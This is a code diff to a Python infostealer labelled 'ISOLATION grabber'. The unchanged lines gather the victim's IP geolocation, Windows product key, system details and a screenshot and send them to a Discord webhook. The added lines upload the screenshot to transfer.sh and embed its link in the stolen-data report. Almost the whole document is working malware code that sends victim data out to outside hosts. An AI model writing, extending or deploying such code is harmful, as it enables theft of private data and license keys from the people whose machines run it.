@@ -48,7 +48,10 @@ pcname = os.path.expanduser("~")
 data_link = f"https://ipinfo.io/{IPAddr.text[:-2]}/json"
 respons = urlopen(data_link)
 data = json.load(respons)
-
+def upload_to_transfer_sh(file_path):
+    with open(file_path, 'rb') as file:
+        response = requests.put('https://transfer.sh/' + file_path, data=file)
+        return response.text.strip()
 def get_windows_product_key():
     try:
         import winreg
@@ -119,13 +122,14 @@ Distribution: {get_linux_distro()}
 '''
 screenshot = ImageGrab.grab()
 screenshot.save("screenshot.png")
+screenshot_url = upload_to_transfer_sh("screenshot.png")
 def main():
     webhook = discord_webhook.DiscordWebhook(url=str(config["WEBHOOK"]),rate_limit_retry= True)
     embed = discord_webhook.DiscordEmbed(title="ISOLATION",description=embedcont, color="23272A")
     embed.set_timestamp()
     embed.set_footer(text="Grabbed w/ ISOLATION grabber")
     embed.set_thumbnail("https://media.discordapp.net/attachments/1136359120233046057/1142457082243711007/1e35053d0cd075d470bd6a80a2a9a1c1.png?width=449&height=449")
-    embed.set_image("./screenshot.png")
+    embed.set_image(screenshot_url)
     webhook.add_embed(embed=embed)
     webhook.execute()
 if __name__== "__main__":
